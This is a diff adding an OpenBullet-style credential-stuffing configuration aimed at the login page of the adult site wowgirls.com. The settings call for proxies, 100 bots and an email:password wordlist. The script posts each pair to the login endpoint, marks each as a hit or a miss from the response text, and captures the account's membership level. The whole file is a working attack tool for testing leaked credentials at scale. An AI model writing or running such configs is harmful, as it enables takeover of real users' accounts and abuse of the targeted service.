@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "WowGirls",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-23T18:11:47.3455749+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://auth.wowgirls.com/login?return=https%3A%2F%2Fvenus.wowgirls.com%2F" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#LOGIN REQUEST POST "https://auth.wowgirls.com/login" AutoRedirect=TRUE 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://auth.wowgirls.com" 
+  HEADER "referer: https://auth.wowgirls.com/login?return=https%3A%2F%2Fvenus.wowgirls.com%2F" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "You have no access to WowGirls.com" 
+  KEYCHAIN Success OR 
+    KEY ">Log out<" 
+#CAPTURE_LEVEL PARSE "<SOURCE>" LR "user_level_" "\">" Recursive=FALSE -> CAP "Level" "" "" 
